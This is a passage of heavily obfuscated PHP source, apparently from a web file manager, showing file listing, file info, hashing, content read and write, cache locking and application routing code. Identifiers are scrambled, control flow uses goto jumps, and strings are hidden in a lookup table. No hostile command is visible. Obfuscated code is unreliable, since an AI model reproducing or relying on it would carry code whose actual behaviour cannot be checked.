$CØ¹Æ‘É… = $this->iconvSystem($CØ¹Æ‘É…); return (double) abs(sprintf($_SERVER[ì‹É][1131], @filesize($CØ¹Æ‘É…))); } public function info($D‚èÖâÂÈ ) { $D‚èÖâÂÈ  = $this->iconvSystem($D‚èÖâÂÈ ); if ($this->isFolder($D‚èÖâÂÈ )) { return $this->folderInfo($D‚èÖâÂÈ ); } else { if ($this->isFile($D‚èÖâÂÈ )) { return $this->fileInfo($D‚èÖâÂÈ ); } } return !1; } protected function infoChildren($D²à Ï„øà, &$F„‘›¶ÍÄ¬, $Bï„¨Õ×Ù = true) { $a²íå¥Üî³ =& $_SERVER[ì‹É]; $D²à Ï„øà = rtrim($D²à Ï„øà, $a²íå¥Üî³[8]) . $a²íå¥Üî³[8]; if ($Bï„¨Õ×Ù) { check_abort(); $D²à Ï„øà = $this->iconvSystem($D²à Ï„øà); } if (!($c‚‹š‹ÌÛ— = @opendir($D²à Ï„øà))) { return; } while (($aÒÇôç„‰Ë = readdir($c‚‹š‹ÌÛ—)) !== !1) { if ($aÒÇôç„‰Ë == $a²íå¥Üî³[94] || $aÒÇôç„‰Ë == $a²íå¥Üî³[1129]) { continue; } $CôŞ½”ÓĞÛ = $D²à Ï„øà . $aÒÇôç„‰Ë; if (is_file($CôŞ½”ÓĞÛ)) { $F„‘›¶ÍÄ¬[$a²íå¥Üî³[79]]++; $F„‘›¶ÍÄ¬[$a²íå¥Üî³[78]] += (double) abs(sprintf($a²íå¥Üî³[1131], @filesize($CôŞ½”ÓĞÛ))); } else { $F„‘›¶ÍÄ¬[$a²íå¥Üî³[80]]++; $this->infoChildren($CôŞ½”ÓĞÛ, $F„‘›¶ÍÄ¬, !1); } } closedir($c‚‹š‹ÌÛ—); } private function folderInfo($aÒ‰öôÁçñ, $c˜ÙõªŒôì = false) { $eòîæò÷Ûß =& $_SERVER[ì‹É]; $aÒ‰öôÁçñ = rtrim($aÒ‰öôÁçñ, $eòîæò÷Ûß[8]) . $eòîæò÷Ûß[8]; $eèÅ†§ÏòÈ = $this->iconvApp($this->pathThis($aÒ‰öôÁçñ)); if ($c˜ÙõªŒôì) { return array($eòîæò÷Ûß[28] => $eèÅ†§ÏòÈ, $eòîæò÷Ûß[76] => $this->getPathOuter($aÒ‰öôÁçñ), $eòîæò÷Ûß[29] => $eòîæò÷Ûß[77]); } $EİŒÄ™¶®ƒ = array($eòîæò÷Ûß[28] => $eèÅ†§ÏòÈ, $eòîæò÷Ûß[76] => $this->getPathOuter($aÒ‰öôÁçñ), $eòîæò÷Ûß[29] => $eòîæò÷Ûß[77], $eòîæò÷Ûß[184] => @filectime($aÒ‰öôÁçñ), $eòîæò÷Ûß[108] => @filemtime($aÒ‰öôÁçñ), $eòîæò÷Ûß[1132] => @fileatime($aÒ‰öôÁçñ), $eòîæò÷Ûß[1126] => is_readable($aÒ‰öôÁçñ), $eòîæò÷Ûß[1127] => is_writable($aÒ‰öôÁçñ), $eòîæò÷Ûß[1133] => get_mode($aÒ‰öôÁçñ)); return $EİŒÄ™¶®ƒ; } private function fileInfo($e¾íšÕº˜¥, $fŒ¤”ÊÁË– = false) { $cñ±áˆİŸ« =& $_SERVER[ì‹É]; $E „›†ä = $this->iconvApp($this->pathThis($e¾íšÕº˜¥)); if ($fŒ¤”ÊÁË–) { return array($cñ±áˆİŸ«[28] => $E „›†ä, $cñ±áˆİŸ«[76] => $this->getPathOuter($e¾íšÕº˜¥), $cñ±áˆİŸ«[29] => $cñ±áˆİŸ«[164], $cñ±áˆİŸ«[78] => $this->size($e¾íšÕº˜¥), $cñ±áˆİŸ«[157] => $this->ext($E „›†ä)); } $a×‚ÏÊÊ– = array($cñ±áˆİŸ«[28] => $E „›†ä, $cñ±áˆİŸ«[76] => $this->getPathOuter($e¾íšÕº˜¥), $cñ±áˆİŸ«[29] => $cñ±áˆİŸ«[164], $cñ±áˆİŸ«[184] => @filectime($e¾íšÕº˜¥), $cñ±áˆİŸ«[108] => @filemtime($e¾íšÕº˜¥), $cñ±áˆİŸ«[1132] => @fileatime($e¾íšÕº˜¥), $cñ±áˆİŸ«[78] => $this->size($e¾íšÕº˜¥), $cñ±áˆİŸ«[157] => $this->ext($E „›†ä), $cñ±áˆİŸ«[1126] => is_readable($e¾íšÕº˜¥), $cñ±áˆİŸ«[1127] => is_writable($e¾íšÕº˜¥), $cñ±áˆİŸ«[1133] => get_mode($e¾íšÕº˜¥)); return $a×‚ÏÊÊ–; } public function exist($B´ÍÄ“Ü¹…) { $B´ÍÄ“Ü¹… = $this->iconvSystem($B´ÍÄ“Ü¹…); return @file_exists($B´ÍÄ“Ü¹…); } public function isFile($eˆ•Ì³­ÄÖ) { $eˆ•Ì³­ÄÖ = $this->iconvSystem($eˆ•Ì³­ÄÖ); return @is_file($eˆ•Ì³­ÄÖ); } public function isFolder($A¤¹›‰‰©¨) { $A¤¹›‰‰©¨ = $this->iconvSystem($A¤¹›‰‰©¨); return @is_dir($A¤¹›‰‰©¨); } public function listPath($e¡½Óä‰”ë, $CÜù£‚·İà = false) { goto f§Â‚ÈÄƒ; f§Â‚ÈÄƒ: $EæŠ£‚Õœˆ =& $_SERVER[ì‹É]; $e¡½Óä‰”ë = $this->iconvSystem($e¡½Óä‰”ë); $e¡½Óä‰”ë = rtrim($e¡½Óä‰”ë, $EæŠ£‚Õœˆ[8]) . $EæŠ£‚Õœˆ[8]; goto dæƒÙÄƒÙ; dæƒÙÄƒÙ: $AšĞè¦³ÊÇ = array($EæŠ£‚Õœˆ[75] => array(), $EæŠ£‚Õœˆ[74] => array()); if (!($F½›®ºÍ = @opendir($e¡½Óä‰”ë))) { return $AšĞè¦³ÊÇ; } while (($cÛï÷ÎµÓÑ = readdir($F½›®ºÍ)) !== !1) { if ($cÛï÷ÎµÓÑ == $EæŠ£‚Õœˆ[94] || $cÛï÷ÎµÓÑ == $EæŠ£‚Õœˆ[1129]) { continue; } $d–ªë™™¼Â = $e¡½Óä‰”ë . $cÛï÷ÎµÓÑ; if (is_file($d–ªë™™¼Â)) { $AšĞè¦³ÊÇ[$EæŠ£‚Õœˆ[74]][] = $this->fileInfo($d–ªë™™¼Â, $CÜù£‚·İà); } else { $AšĞè¦³ÊÇ[$EæŠ£‚Õœˆ[75]][] = $this->folderInfo($d–ªë™™¼Â, $CÜù£‚·İà); } } goto A·­ôÈ«­; A·­ôÈ«­: closedir($F½›®ºÍ); return $AšĞè¦³ÊÇ; goto dí–²À–½è; dí–²À–½è: } public function listAll($føà‘ïÖŒˆ, &$b°óŸ­äî‚ = array()) { goto då’Èƒ”ÎÅ; då’Èƒ”ÎÅ: $BÃ©µ¼ƒ =& $_SERVER[ì‹É]; $føà‘ïÖŒˆ = $this->iconvSystem($føà‘ïÖŒˆ); $føà‘ïÖŒˆ = rtrim($føà‘ïÖŒˆ, $BÃ©µ¼ƒ[8]) . $BÃ©µ¼ƒ[8]; goto bœšß½—£Ğ; bœšß½—£Ğ: if (!($d¿ËÏ—Ó®´ = @opendir($føà‘ïÖŒˆ))) { return $b°óŸ­äî‚; } while (($d£Ã»¿èŒ» = readdir($d¿ËÏ—Ó®´)) !== !1) { if ($d£Ã»¿èŒ» == $BÃ©µ¼ƒ[94] || $d£Ã»¿èŒ» == $BÃ©µ¼ƒ[1129]) { continue; } $bŒƒÓ‹¿Œ½ = $føà‘ïÖŒˆ . $d£Ã»¿èŒ»; if (is_dir($bŒƒÓ‹¿Œ½)) { $b°óŸ­äî‚[] = array($BÃ©µ¼ƒ[76] => $bŒƒÓ‹¿Œ½ . $BÃ©µ¼ƒ[8], $BÃ©µ¼ƒ[77] => 1, $BÃ©µ¼ƒ[78] => 0); $this->listAll($bŒƒÓ‹¿Œ½, $b°óŸ­äî‚); } else { $b°óŸ­äî‚[] = array($BÃ©µ¼ƒ[76] => $bŒƒÓ‹¿Œ½, $BÃ©µ¼ƒ[77] => 0, $BÃ©µ¼ƒ[78] => $this->size($bŒƒÓ‹¿Œ½)); } } closedir($d¿ËÏ—Ó®´); goto EÀ±Íé¼Ú¾; EÀ±Íé¼Ú¾: return $b°óŸ­äî‚; goto fÇ¤ö³Ş¼ö; fÇ¤ö³Ş¼ö: } public function has($DÏ‡ŠßÔ¼À, $Eí…†òš†Î = false, $BèªÆ‰š’ = true) { goto d”ƒÈó‹´±; c‡Œğà°ÑÙ: if (!($B„ÈÖ” Ÿª = @opendir($DÏ‡ŠßÔ¼À))) { return !1; } $eÅ‹éŠ‡¢Œ = 0; $d©·æ‰ËÓš = 0; goto e†â‹‹Ù‹‹; aëòŞ˜Ú: return !1; goto Bİ­¸¢•Şî; e†â‹‹Ù‹‹: while (($DŞÒƒè˜”æ = readdir($B„ÈÖ” Ÿª)) !== !1) { if ($DŞÒƒè˜”æ == $cÅ§²ì¦¥‰[94] || $DŞÒƒè˜”æ == $cÅ§²ì¦¥‰[1129]) { continue; } $D†ÓÑ“˜éĞ = $DÏ‡ŠßÔ¼À . $DŞÒƒè˜”æ; if ($Eí…†òš†Î) { if (@is_file($D†ÓÑ“˜éĞ)) { $eÅ‹éŠ‡¢Œ++; } else { $d©·æ‰ËÓš++; } continue; } if ($BèªÆ‰š’) { if (@is_file($D†ÓÑ“˜éĞ)) { return !0; } } else { if (@is_dir($D†ÓÑ“˜éĞ . $cÅ§²ì¦¥‰[8])) { return !0; } } } closedir($B„ÈÖ” Ÿª); if ($Eí…†òš†Î) { return array($cÅ§²ì¦¥‰[188] => $eÅ‹éŠ‡¢Œ, $cÅ§²ì¦¥‰[189] => $d©·æ‰ËÓš); } goto aëòŞ˜Ú; d”ƒÈó‹´±: $cÅ§²ì¦¥‰ =& $_SERVER[ì‹É]; $DÏ‡ŠßÔ¼À = $this->iconvSystem($DÏ‡ŠßÔ¼À); $DÏ‡ŠßÔ¼À = rtrim($DÏ‡ŠßÔ¼À, $cÅ§²ì¦¥‰[8]) . $cÅ§²ì¦¥‰[8]; goto c‡Œğà°ÑÙ; Bİ­¸¢•Şî: } public function hashSimple($f–‰«äÅ„) { goto aß­§Òµ¼©; cÜÒÆ¥î¡á: $F­Šæ›ÄÉÀ = fopen($f–‰«äÅ„, $Ašç¢†õâŒ[1134]); if (!$F­Šæ›ÄÉÀ) { return $e‡ÙÆ¡íÃ; } for ($B¶ŠæçÓ ğ = 0; $B¶ŠæçÓ ğ < $Aí§×®•Ş; $B¶ŠæçÓ ğ++) { fseek($F­Šæ›ÄÉÀ, $B´öÑŞßø * $B¶ŠæçÓ ğ); $e‡ÙÆ¡íÃ .= fread($F­Šæ›ÄÉÀ, $bˆõ¼ø°Ú‘); } goto a¤®Â­×µ÷; bíãæ³Íñ: return md5($e‡ÙÆ¡íÃ) . $FğªïÅÏ¬ò; goto FË£ÅÙ²šª; aß­§Òµ¼©: $Ašç¢†õâŒ =& $_SERVER[ì‹É]; if (!$f–‰«äÅ„) { return md5($Ašç¢†õâŒ[33]); } $f–‰«äÅ„ = $this->iconvSystem($f–‰«äÅ„); goto e´‹ªèóí‚; e´‹ªèóí‚: $FğªïÅÏ¬ò = $this->size($f–‰«äÅ„); $bˆõ¼ø°Ú‘ = 200; $Aí§×®•Ş = 50; goto f›»›Û‘İ×; a¤®Â­×µ÷: fseek($F­Šæ›ÄÉÀ, $FğªïÅÏ¬ò - $bˆõ¼ø°Ú‘); $e‡ÙÆ¡íÃ .= fread($F­Šæ›ÄÉÀ, $bˆõ¼ø°Ú‘); fclose($F­Šæ›ÄÉÀ); goto bíãæ³Íñ; f›»›Û‘İ×: if ($FğªïÅÏ¬ò <= $bˆõ¼ø°Ú‘ * $Aí§×®•Ş) { return $this->hashMd5($f–‰«äÅ„) . $FğªïÅÏ¬ò; } $e‡ÙÆ¡íÃ = $Ašç¢†õâŒ[33]; $B´öÑŞßø = intval($FğªïÅÏ¬ò / $Aí§×®•Ş); goto cÜÒÆ¥î¡á; FË£ÅÙ²šª: } public function getContent($fµÊŸó•¾) { $fµÊŸó•¾ = $this->iconvSystem($fµÊŸó•¾); return file_get_contents($fµÊŸó•¾); } public function setContent($fÒÀïÈ‡‡š, $D´á¦ÃÀê = '') { $fÒÀïÈ‡‡š = $this->iconvSystem($fÒÀïÈ‡‡š); @file_put_contents($fÒÀïÈ‡‡š, $D´á¦ÃÀê, LOCK_EX); clearstatcache(); return strlen($D´á¦ÃÀê) == filesize($fÒÀïÈ‡‡š); } public function fileSubstr($cÙã•äˆ´, $bŞ²‹“ˆÌ = 0, $DØ‚ø‡ÁËä = false) { goto CÂ’¥´«ô; A»Ë§Ç”Ëª: return $C¥Ó´·‚¤Ø; goto bÒ¦â«ĞÄù; eïˆÛ—Á¡‹: fseek($fã…œƒˆÈŠ, $bŞ²‹“ˆÌ); $C¥Ó´·‚¤Ø = fread($fã…œƒˆÈŠ, $DØ‚ø‡ÁËä); fclose($fã…œƒˆÈŠ); goto A»Ë§Ç”Ëª; eÑ‚öç×Û: if ($DØ‚ø‡ÁËä <= 0) { return $d¨ˆ©‹Ú·Á[33]; } $fã…œƒˆÈŠ = fopen($cÙã•äˆ´, $d¨ˆ©‹Ú·Á[1134]); if (!$fã…œƒˆÈŠ) { return !1; } goto eïˆÛ—Á¡‹; CÂ’¥´«ô: $d¨ˆ©‹Ú·Á =& $_SERVER[ì‹É]; $cÙã•äˆ´ = $this->iconvSystem($cÙã•äˆ´); if ($DØ‚ø‡ÁËä === !1) { $DØ‚ø‡ÁËä = $this->size($cÙã•äˆ´); } goto eÑ‚öç×Û; bÒ¦â«ĞÄù: } public function upload($B…•Ÿ°©Ö, $d…¬–ºŠÂ, $Cø°Ñ­‰ªö = false, $aÂÇ¥¤áõ = REPEAT_REPLACE) { $E›ÎŠÍ¸™Ä = $this->copyFile($d…¬–ºŠÂ, $B…•Ÿ°©Ö); return $E›ÎŠÍ¸™Ä ? $this->getPathOuter($B…•Ÿ°©Ö) : !1; } public function download($A®ÜáìäéÖ, $d³¥‚à¬îŠ) { return $this->iconvSystem($A®ÜáìäéÖ); } } goto d·ˆ¯Îšò‰; bÌ¬å¤Şî: register_shutdown_function($_SERVER[Ü›¼][35]); set_error_handler($_SERVER[Ü›¼][48], $e°ßµ¸²µ©); if (function_exists($_SERVER[Ü›¼][49])) { set_exception_handler($_SERVER[Ü›¼][50]); } goto DÜœ†ÑÎš; cŞ©Ïí†˜: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto EÛ‹Å°İ‹±; EÛ‹Å°İ‹±: $BóâšŸî† =& $_SERVER[ì‹É]; if (self::$handle) { return self::$handle; } $AÌ‘ÚÎ…ç‰ = $GLOBALS[$BóâšŸî†[6]][$BóâšŸî†[334]]; goto eŞ˜Â—‰Ô; Aø–è×£Ë: switch ($AÌ‘ÚÎ…ç‰[$BóâšŸî†[758]]) { case $BóâšŸî†[761]: self::$handle = new CacheLockRedis(); break; case $BóâšŸî†[762]: self::$handle = new CacheLockMemcached(); break; case $BóâšŸî†[17]: self::$handle = new CacheLockDatabase(); break; case $BóâšŸî†[164]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto dğ ©â•ëŸ; eŞ˜Â—‰Ô: self::$timeout = $AÌ‘ÚÎ…ç‰[$BóâšŸî†[770]] ? $AÌ‘ÚÎ…ç‰[$BóâšŸî†[770]] : 10; $FŒƒÌ¯Šö = _get($GLOBALS[$BóâšŸî†[6]], $BóâšŸî†[771]); if ($AÌ‘ÚÎ…ç‰[$BóâšŸî†[758]] == $BóâšŸî†[17] && $FŒƒÌ¯Šö == $BóâšŸî†[9]) { $AÌ‘ÚÎ…ç‰[$BóâšŸî†[758]] = $BóâšŸî†[164]; } goto Aø–è×£Ë; dğ ©â•ëŸ: } private static function key($F±¶Ñ¶ÍÌÃ) { return $_SERVER[ì‹É][772] . Cache::key($F±¶Ñ¶ÍÌÃ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($a¢—æÎ×ê = '') { self::$errorMsg = $a¢—æÎ×ê; } public static function lockGlobal($B’½¹ÄÇ , $FÃ‚Ü¸ïÂ) { return self::lock($B’½¹ÄÇ , $FÃ‚Ü¸ïÂ, !0); } public static function lock($a®¼šªêÈÚ, $dö¶ÁíÄÜ = false, $bÚĞï±—¯© = false) { goto Aõš¥‰ÒâÒ; cƒ¥øí†Ÿ: $dö¶ÁíÄÜ = $dö¶ÁíÄÜ ? $dö¶ÁíÄÜ : self::$timeout; $e½Íªˆ‚ª¥ = $BäÁÏšÄÎ->lock($FÙÂìïˆ…˜, $dö¶ÁíÄÜ); if (!$e½Íªˆ‚ª¥) { $CƒÓğ·¬”† = $DÕºƒÈ¼ÍŠ[773] . $dö¶ÁíÄÜ . $DÕºƒÈ¼ÍŠ[68] . self::$errorMsg . $DÕºƒÈ¼ÍŠ[68] . get_caller_msg(); $d²‡”ùÅë„ = "\114\x6f\143\153\x20\x61\x63\164\x69\x6f\x6e\x3a\40{$FÙÂìïˆ…˜}\40\x74\x69\x6d\x65\x6f\165\x74\x2c\x6f\166\145\162\40{$dö¶ÁíÄÜ}\x20\x73"; $d²‡”ùÅë„ = self::$errorMsg ? self::$errorMsg : $FÔÔÄÉ×¼œ; write_log($CƒÓğ·¬”†, $DÕºƒÈ¼ÍŠ[774]); show_json($d²‡”ùÅë„, !1); } goto D¶²Œ·ÎÅè; D¶²Œ·ÎÅè: if (!$bÚĞï±—¯©) { self::$lockItem[$FÙÂìïˆ…˜] = !0; } return $e½Íªˆ‚ª¥; goto CŸœ¨±óè³; Aõš¥‰ÒâÒ: $DÕºƒÈ¼ÍŠ =& $_SERVER[ì‹É]; $BäÁÏšÄÎ = self::init(); $FÙÂìïˆ…˜ = self::key($a®¼šªêÈÚ); goto cƒ¥øí†Ÿ; CŸœ¨±óè³: } public static function lockGet($aŠã—†—¼Ê) { $E¹ˆ’ ÅİÚ = self::key($aŠã—†—¼Ê); if (self::$lockItem[$E¹ˆ’ ÅİÚ]) { return self::$lockItem[$E¹ˆ’ ÅİÚ]; } return self::init()->lockGet($E¹ˆ’ ÅİÚ); } public static function unlock($BÄŠØÉŠ»Â) { $d¿…†§Èî¶ = self::key($BÄŠØÉŠ»Â); self::$lockItem[$d¿…†§Èî¶] = null; return self::init()->unlock($d¿…†§Èî¶); } public static function unlockRuntime() { $BÊ¼ã±Ù°¶ =& $_SERVER[ì‹É]; $b¹‡½‹Ùê÷ = self::init(); $dÆİ«ÎÁ™Ò = !1; foreach (self::$lockItem as $f–»Ÿ†Óàä => $AËÏêØíº ) { if (!$AËÏêØíº ) { continue; } $b¹‡½‹Ùê÷->unlock($f–»Ÿ†Óàä); if (!$dÆİ«ÎÁ™Ò) { $dÆİ«ÎÁ™Ò = !0; write_log($BÊ¼ã±Ù°¶[775] . $f–»Ÿ†Óàä . $BÊ¼ã±Ù°¶[68] . get_caller_msg(), $BÊ¼ã±Ù°¶[774]); continue; } write_log($BÊ¼ã±Ù°¶[775] . $f–»Ÿ†Óàä, $BÊ¼ã±Ù°¶[774]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $E¿›çõÉ¾« =& $_SERVER[ì‹É]; $eÌ‚ãÇÄÏš = $GLOBALS[$E¿›çõÉ¾«[6]][$E¿›çõÉ¾«[334]]; self::$cachePath = $eÌ‚ãÇÄÏš[$E¿›çõÉ¾«[164]][$E¿›çõÉ¾«[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($D¬Íè–ñ—Ì, $b»…“Íš = 0) { goto C¯íÙàèî²; C¯íÙàèî²: $aİßÒõé³ê =& $_SERVER[ì‹É]; $c—™›õšæ = microtime(!0); $b¶é»…Èò = $c—™›õšæ + $b»…“Íš + 0.0001; goto CÏÔ†—­É; CÏÔ†—­É: $e™¬ÔÚåô = rtrim(self::$cachePath, $aİßÒõé³ê[8]) . $aİßÒõé³ê[776] . md5($D¬Íè–ñ—Ì) . $aİßÒõé³ê[777]; if (file_exists($e™¬ÔÚåô) && filemtime($e™¬ÔÚåô) && filemtime($e™¬ÔÚåô) < time() - 10) { @unlink($e™¬ÔÚåô); } do { if (file_exists($e™¬ÔÚåô)) { cacheLockWait(); continue; } $E”Šø¿»‹Ê = fopen($e™¬ÔÚåô, $aİßÒõé³ê[778]); if (!$E”Šø¿»‹Ê) { return !1; } $fùèÄÊö‘ = flock($E”Šø¿»‹Ê, LOCK_EX | LOCK_NB); self::$caches[$D¬Íè–ñ—Ì] = array($aİßÒõé³ê[779] => $E”Šø¿»‹Ê, $aİßÒõé³ê[164] => $e™¬ÔÚåô); fwrite($E”Šø¿»‹Ê, $b¶é»…Èò); clearstatcache(); if ($E”Šø¿»‹Ê && $fùèÄÊö‘) { return !0; } cacheLockWait(); } while (microtime(!0) < $b¶é»…Èò); goto f‹…†¶Ÿ š; f‹…†¶Ÿ š: $this->unlock($D¬Íè–ñ—Ì); return !1; goto EßäîÉË­Ë; EßäîÉË­Ë: } public function lockGet($b‚•‹Èöµ) { $EàáêÂ˜Üö =& $_SERVER[ì‹É]; $fõÃ¡´âôô = rtrim(self::$cachePath, $EàáêÂ˜Üö[8]) . $EàáêÂ˜Üö[776] . md5($b‚•‹Èöµ) . $EàáêÂ˜Üö[777]; return file_exists($fõÃ¡´âôô); } public function unlock($cåîìŠ×) { goto eÃïß¼¼ïğ; eÃïß¼¼ïğ: $D ¶Å„ëœ¯ =& $_SERVER[ì‹É]; $C‹„ù¿íŒ = self::$caches[$cåîìŠ×]; if (!$C‹„ù¿íŒ) { return; } goto c…÷èé§„Á; cê×í¸±ê: unset(self::$caches[$cåîìŠ×]); goto DöÂ¼‘˜®Ë; c…÷èé§„Á: @flock($C‹„ù¿íŒ[$D ¶Å„ëœ¯[779]], LOCK_UN); @fclose($C‹„ù¿íŒ[$D ¶Å„ëœ¯[779]]); @unlink($C‹„ù¿íŒ[$D ¶Å„ëœ¯[164]]); goto cê×í¸±ê; DöÂ¼‘˜®Ë: } } goto c‰øöÚ«¬„; E¶ôÀ¹µ÷ã: $A¡Ììµ¯ = $_SERVER[ì‹É][542]; if (strlen($A¡Ììµ¯) < $_SERVER[ì‹É][543]) { return; } class Application { private $defaultModule = "\x69\156\144\x65\170"; private $defaultController = "\151\156\144\145\170"; private $defaultAction = "\x69\x6e\x64\x65\x78"; function __construct() { } public function setDefault($d´÷ãÌˆ²ù) { goto dĞ°™³ˆŒ; cšÏ©“„¢Ó: $fİ×‘Ş¡Æ¾ = $fÛâ‚ÍÔ¬Ş[545]; while ($fİ×‘Ş¡Æ¾ < $fÛâ‚ÍÔ¬Ş[546]) { if ($fİ×‘Ş¡Æ¾ >= 0) { break; } $fİ×‘Ş¡Æ¾++; } goto bñÑãÛØ¤¡; eŞŠƒ¦ÂÊ¾: $this->defaultModule = $b‡İïš­õ¾[0] ? $b‡İïš­õ¾[0] : $this->defaultModule; $Eà‡ˆæğ = $fÛâ‚ÍÔ¬Ş[544]; if (!$Eà‡ˆæğ) { die; } goto B¼¿åŒª—; dĞ°™³ˆŒ: $fÛâ‚ÍÔ¬Ş =& $_SERVER[ì‹É]; $a›Ù”ˆ›ô– =& $_SERVER[ºÀ]; $b‡İïš­õ¾ = $a›Ù”ˆ›ô–[0]($a›Ù”ˆ›ô–[1], $a›Ù”ˆ›ô–[2]($d´÷ãÌˆ²ù, $a›Ù”ˆ›ô–[1])); goto eŞŠƒ¦ÂÊ¾; B¼¿åŒª—: $this->defaultController = $b‡İïš­õ¾[1] ? $b‡İïš­õ¾[1] : $this->defaultController; $this->defaultAction = $b‡İïš­õ¾[2] ? $b‡İïš­õ¾[2] : $this->defaultAction; $this->{$_SERVER[ºÀ][3]}($a›Ù”ˆ›ô–[4], array($this, $a›Ù”ˆ›ô–[5])); goto cšÏ©“„¢Ó; bñÑãÛØ¤¡: } public function appRun($dÕéç¼×‚) { goto få‹æ—îÆ£; A«“Ê„º¬¿: $dÉ¡ò…‡‡Ë[13](array($dÉ¡ò…‡‡Ë[14], $dÉ¡ò…‡‡Ë[15]), $B­ÃİÈš¬ø . $dÉ¡ò…‡‡Ë[16], $dÕéç¼×‚); $dÉ¡ò…‡‡Ë[17]($dÕéç¼×‚); $dÉ¡ò…‡‡Ë[13](array($dÉ¡ò…‡‡Ë[14], $dÉ¡ò…‡‡Ë[15]), $B­ÃİÈš¬ø . $dÉ¡ò…‡‡Ë[18], $dÕéç¼×‚); goto cä°åÒ¼·’; Fâ—™´¤­œ: $E—¢ØÒö¦Í = $dÉ¡ò…‡‡Ë[6]($dÎ…œÁÅ½¼[0]); $B­ÃİÈš¬ø = $dÉ¡ò…‡‡Ë[7]; if ($E—¢ØÒö¦Í == $dÉ¡ò…‡‡Ë[8]) { $B­ÃİÈš¬ø = $dÉ¡ò…‡‡Ë[9]; $dÎ…œÁÅ½¼[0] = $dÉ¡ò…‡‡Ë[10]; $dÎ…œÁÅ½¼[1] = $dÎ…œÁÅ½¼[1] . $dÉ¡ò…‡‡Ë[11]; $dÕéç¼×‚ = $dÉ¡ò…‡‡Ë[12]($dÉ¡ò…‡‡Ë[1], $dÎ…œÁÅ½¼); $dÕéç¼×‚ = $dÉ¡ò…‡‡Ë[2]($dÕéç¼×‚, $dÉ¡ò…‡‡Ë[1]); } goto A«“Ê„º¬¿; få‹æ—îÆ£: $DÉİáÄšËø =& $_SERVER[ì‹É]; $dÉ¡ò…‡‡Ë =& $_SERVER[ºÀ]; $dÎ…œÁÅ½¼ = $dÉ¡ò…‡‡Ë[0]($dÉ¡ò…‡‡Ë[1], $dÕéç¼×‚); goto Fâ—™´¤­œ; cä°åÒ¼·’: $BøÊº³áòÅ = $DÉİáÄšËø[547]; if (strlen($BøÊº³áòÅ) < $DÉİáÄšËø[548]) { die; } goto A×Õ†²îÇ°; A×Õ†²îÇ°: } private function autorun() { $fãÄÇŞŸÌè =& $_SERVER[ºÀ]; global $config; $fÄÂ¨Õ§° = $_SERVER[ì‹É][549]; if ($fãÄÇŞŸÌè[19]($config[$fãÄÇŞŸÌè[20]]) == 0) { return; } foreach ($config[$fãÄÇŞŸÌè[20]] as $f«ŒŒõ›É„ => $e¼¢í‹ñ¨Ü) { $this->{$_SERVER[ºÀ][21]}($e¼¢í‹ñ¨Ü); } } private function jfbn5980a67a() { goto BòŠ©ù±«; BòŠ©ù±«: $aÕ—ÎĞÔòÉ =& $_SERVER[ì‹É]; $f ½•¯¦§¡ =& $_SERVER[ºÀ]; $EŒìÓ›±­Ö = $f ½•¯¦§¡[8]; goto aªêö’¤; DªÜğ—âáÎ: if ($f ½•¯¦§¡[6]($f ½•¯¦§¡[25]($dó¶­ÊÏ©æ, -$f ½•¯¦§¡[24]($EŒìÓ›±­Ö))) != $EŒìÓ›±­Ö) { return; } $B‰ƒ­×¿ï÷ = $f ½•¯¦§¡[25]($dó¶­ÊÏ©æ, 0, -$f ½•¯¦§¡[24]($EŒìÓ›±­Ö)); $aÏ¦ñ¯“‡— = array($f ½•¯¦§¡[8], $B‰ƒ­×¿ï÷); goto aâ¢™†‚Ì; aªêö’¤: $cÖÜ‹Ëãª = $aÕ—ÎĞÔòÉ[550]; if (!$cÖÜ‹Ëãª) { die; } $dó¶­ÊÏ©æ = $GLOBALS[$f ½•¯¦§¡[22]][$f ½•¯¦§¡[23]][0]; goto CŠ©Ë—ĞŒ; CŠ©Ë—ĞŒ: $DÛ¥¹Ô„íŠ = $aÕ—ÎĞÔòÉ[551]; if (!$DÛ¥¹Ô„íŠ) { return; } if (!$dó¶­ÊÏ©æ || $f ½•¯¦§¡[24]($dó¶­ÊÏ©æ) <= $f ½•¯¦§¡[24]($EŒìÓ›±­Ö)) { return; } goto DªÜğ—âáÎ; bõèÀñèà›: $GLOBALS[$f ½•¯¦§¡[22]][$f ½•¯¦§¡[23]] = $f ½•¯¦§¡[27]($aÏ¦ñ¯“‡—, $dïš…Ê½ËÎ); $GLOBALS[$f ½•¯¦§¡[22]][$f ½•¯¦§¡[28]] = $f ½•¯¦§¡[29]($f ½•¯¦§¡[1], $GLOBALS[$f ½•¯¦§¡[22]][$f ½•¯¦§¡[23]]); goto c«ã‘¬¯Èç; aâ¢™†‚Ì: $dïš…Ê½ËÎ = $f ½•¯¦§¡[26]($GLOBALS[$f ½•¯¦§¡[22]][$f ½•¯¦§¡[23]], 1); $d÷‘›´Ì„ = $aÕ—ÎĞÔòÉ[552]; while (strlen($d÷‘›´Ì„) < $aÕ—ÎĞÔòÉ[553]) { if (!$d÷‘›´Ì„) { break; } $d÷‘›´Ì„++; } goto bõèÀñèà›; c«ã‘¬¯Èç: } private function fphj54794ac1() { goto b†‘‚§ğÍº; AšÏ‰ìµ‘¨: $A­÷®ç·‹¾ = $b“†¨–„Ü©[33]($dáÇƒîÀ­¬, $aöè‚é™ÓĞ); $cÙŒ±»Ë¦Â = $A¹½ÍÛİø[554]; if (strlen($cÙŒ±»Ë¦Â) < $A¹½ÍÛİø[553]) { return; } goto céˆÏòãÀ…; f¡Ç¯Ö£µ§: $dáÇƒîÀ­¬ = $_SERVER[$b“†¨–„Ü©[30]]; $aöè‚é™ÓĞ = $b“†¨–„Ü©[31]; if (!$b“†¨–„Ü©[32]($dáÇƒîÀ­¬, $aöè‚é™ÓĞ)) { return; } goto AšÏ‰ìµ‘¨; b†‘‚§ğÍº: $A¹½ÍÛİø =& $_SERVER[ì‹É]; $b“†¨–„Ü© =& $_SERVER[ºÀ]; if ($GLOBALS[$b“†¨–„Ü©[22]][$b“†¨–„Ü©[28]] != $b“†¨–„Ü©[10]) { return; } goto f¡Ç¯Ö£µ§; Eº“·„É: if (strlen($bƒ£§—ª) < $A¹½ÍÛİø[556]) { return; } $GLOBALS[$b“†¨–„Ü©[22]][$b“†¨–„Ü©[23]] = 